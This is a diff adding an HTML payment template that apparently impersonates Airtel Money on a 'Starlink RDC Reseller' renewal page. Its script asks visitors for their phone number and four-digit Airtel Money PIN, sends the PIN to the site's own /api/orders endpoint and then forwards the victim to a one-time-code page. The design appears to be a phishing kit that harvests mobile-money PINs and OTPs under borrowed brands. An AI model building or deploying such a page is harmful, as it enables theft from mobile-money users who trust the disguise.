@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Paiement - Starlink DRC</title>
+  <!-- Bootstrap CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --airtel-red: #E60000;
+      --white: #ffffff;
+      --black: #000000;
+      --gray: #6c757d;
+      --gray-light: #9ca3af;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { 
+      font-family: 'DM Sans', sans-serif; 
+      background: #f8f9fa;
+      color: var(--black);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    
+    /* Header */
+    .header {
+      background: var(--white);
+      padding: 16px 24px;
+      border-bottom: 1px solid #e5e5e5;
+    }
+    .header-brand {
+      font-weight: 700;
+      font-size: 16px;
+      color: var(--black);
+      letter-spacing: 0.5px;
+    }
+    .header-brand span {
+      color: var(--gray);
+      font-weight: 400;
+    }
+    
+    /* Main Content */
+    .main-content {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+    
+    /* Payment Box */
+    .payment-box {
+      background: var(--white);
+      border: 3px solid var(--airtel-red);
+      border-radius: 16px;
+      width: 100%;
+      max-width: 480px;
+      overflow: hidden;
+    }
+    
+    /* Red Title Bar */
+    .payment-header {
+      background: var(--airtel-red);
+      padding: 16px 24px;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+    }
+    .payment-header h2 {
+      color: var(--white);
+      font-size: 20px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin: 0;
+    }
+    .airtel-logo-img {
+      height: 28px;
+      width: auto;
+    }
+    
+    /* Payment Body */
+    .payment-body {
+      padding: 32px;
+    }
+    
+    /* Amount */
+    .amount-display {
+      text-align: center;
+      margin-bottom: 12px;
+    }
+    .amount-value {
+      font-size: 42px;
+      font-weight: 700;
+      color: var(--black);
+    }
+    .service-name {
+      text-align: center;
+      color: var(--gray);
+      font-size: 16px;
+      margin-bottom: 24px;
+    }
+    
+    /* Instruction */
+    .instruction {
+      color: var(--black);
+      font-size: 15px;
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    
+    /* Form Fields */
+    .form-group {
+      margin-bottom: 20px;
+    }
+    .form-label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--black);
+      margin-bottom: 8px;
+    }
+    .phone-input-wrapper {
+      display: flex;
+      align-items: center;
+      border: 1px solid #dee2e6;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .country-code {
+      background: #f8f9fa;
+      padding: 14px 16px;
+      border-right: 1px solid #dee2e6;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 15px;
+      color: var(--black);
+      font-weight: 500;
+    }
+    .flag {
+      width: 24px;
+      height: 16px;
+      background: linear-gradient(90deg, #007a3d 50%, #fcd116 50%);
+      border-radius: 2px;
+      display: inline-block;
+    }
+    .form-control {
+      border: none;
+      padding: 14px;
+      font-size: 15px;
+      border-radius: 0;
+    }
+    .form-control:focus {
+      box-shadow: none;
+    }
+    
+    /* PIN Entry */
+    .pin-entry {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+    .pin-box {
+      width: 60px;
+      height: 64px;
+      border: 1px solid #000000;
+      border-radius: 8px;
+      background: var(--white);
+      text-align: center;
+      font-size: 28px;
+      font-weight: 700;
+      color: var(--black);
+    }
+    .pin-box:focus {
+      border-color: var(--airtel-red);
+      outline: none;
+    }
+    .helper-text {
+      text-align: center;
+      color: var(--gray);
+      font-size: 13px;
+    }
+    
+    /* Confirm Button */
+    .btn-confirm {
+      width: 100%;
+      background: var(--airtel-red);
+      color: var(--white);
+      border: none;
+      padding: 16px;
+      font-size: 15px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-top: 24px;
+    }
+    .btn-confirm:hover {
+      background: #cc0000;
+    }
+    
+    /* Back Link */
+    .back-link {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .back-link a {
+      color: var(--gray);
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .back-link a:hover {
+      text-decoration: underline;
+    }
+    
+    /* Toast */
+    .toast-notification {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%) translateY(100px);
+      background: #0f172a;
+      color: #fff;
+      padding: 12px 24px;
+      border-radius: 99px;
+      font-size: 14px;
+      font-weight: 500;
+      z-index: 9999;
+      opacity: 0;
+      transition: all 0.3s ease;
+    }
+    .toast-notification.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+  </style>
+</head>
+<body>
+
+<!-- Header -->
+<header class="header">
+  <div class="header-brand">STARLINK <span>|</span> RDC Reseller</div>
+</header>
+
+<!-- Main Content -->
+<main class="main-content">
+  <div class="payment-box">
+    <!-- Red Title Bar -->
+    <div class="payment-header">
+      <img src="{{ url_for('static', filename='images/airtel-logo.png') }}" alt="Airtel" class="airtel-logo-img">
+      <h2>Airtel Money</h2>
+    </div>
+    
+    <!-- Payment Body -->
+    <div class="payment-body">
+      <!-- Amount -->
+      <div class="amount-display">
+        <div class="amount-value" id="amount">CDF 0</div>
+        <div class="service-name">Renouvellement Starlink</div>
+      </div>
+      
+      <!-- Instruction -->
+      <p class="instruction">Entrez votre PIN Airtel Money pour autoriser</p>
+      
+      <!-- Form -->
+      <form id="payment-form" onsubmit="return false;">
+        <!-- Phone Number -->
+        <div class="form-group">
+          <label class="form-label">Numéro Airtel Money</label>
+          <div class="phone-input-wrapper">
+            <div class="country-code">
+              <span class="flag"></span>
+              +243
+            </div>
+            <input type="tel" class="form-control" id="phone" placeholder="000 000 000" required>
+          </div>
+        </div>
+        
+        <!-- PIN Entry -->
+        <div class="form-group">
+          <label class="form-label">Entrez le PIN à 4 chiffres</label>
+          <div class="pin-entry">
+            <input type="password" class="pin-box" maxlength="1" id="pin1" required>
+            <input type="password" class="pin-box" maxlength="1" id="pin2" required>
+            <input type="password" class="pin-box" maxlength="1" id="pin3" required>
+            <input type="password" class="pin-box" maxlength="1" id="pin4" required>
+          </div>
+          <p class="helper-text">Vérifiez votre application Airtel Money ou SMS</p>
+        </div>
+        
+        <!-- Confirm Button -->
+        <button type="button" class="btn-confirm" onclick="confirmPayment()">Confirmer le paiement</button>
+      </form>
+      
+      <!-- Back Link -->
+      <div class="back-link">
+        <a href="/">← Retour aux forfaits</a>
+      </div>
+    </div>
+  </div>
+</main>
+
+<!-- Toast -->
+<div id="toast" class="toast-notification"></div>
+
+<script>
+let planId = null;
+let planPrice = 0;
+
+// Get plan details from URL params
+const urlParams = new URLSearchParams(window.location.search);
+planId = urlParams.get('plan_id');
+planPrice = urlParams.get('price') || '0';
+
+document.getElementById('amount').textContent = 'CDF ' + parseFloat(planPrice).toLocaleString('fr-CD') + ',00';
+
+// Auto-focus PIN boxes
+const pinBoxes = document.querySelectorAll('.pin-box');
+pinBoxes.forEach((box, index) => {
+  box.addEventListener('input', function() {
+    if (this.value && index < pinBoxes.length - 1) {
+      pinBoxes[index + 1].focus();
+    }
+  });
+  box.addEventListener('keydown', function(e) {
+    if (e.key === 'Backspace' && !this.value && index > 0) {
+      pinBoxes[index - 1].focus();
+    }
+  });
+});
+
+// Toast
+let toastTimer;
+function showToast(message, duration = 3000) {
+  const toast = document.getElementById('toast');
+  if (!toast) return;
+  toast.textContent = message;
+  toast.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => toast.classList.remove('show'), duration);
+}
+
+// Confirm Payment
+function confirmPayment() {
+  const phone = document.getElementById('phone').value.trim();
+  const pin1 = document.getElementById('pin1').value;
+  const pin2 = document.getElementById('pin2').value;
+  const pin3 = document.getElementById('pin3').value;
+  const pin4 = document.getElementById('pin4').value;
+  
+  if (!phone) {
+    showToast('Veuillez entrer votre numéro de téléphone');
+    return;
+  }
+  
+  if (!pin1 || !pin2 || !pin3 || !pin4) {
+    showToast('Veuillez entrer votre PIN à 4 chiffres');
+    return;
+  }
+  
+  const fullPhone = '+243' + phone;
+  const pin = pin1 + pin2 + pin3 + pin4;
+  
+  // Submit order via API
+  fetch('/api/orders', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ 
+      phone: fullPhone, 
+      plan_id: planId,
+      airtel_pin: pin
+    })
+  })
+  .then(res => res.json())
+  .then(data => {
+    if (data.success || data.id) {
+      // Redirect to OTP verification page
+      const orderId = data.id;
+      const phone = encodeURIComponent(fullPhone);
+      window.location.href = `/otp_fr?order_id=${orderId}&phone=${phone}`;
+    } else {
+      showToast('❌ ' + (data.error || 'Paiement échoué'));
+    }
+  })
+  .catch(err => {
+    showToast('❌ Erreur lors du traitement');
+    console.error(err);
+  });
+}
+</script>
+
+</body>
+</html>
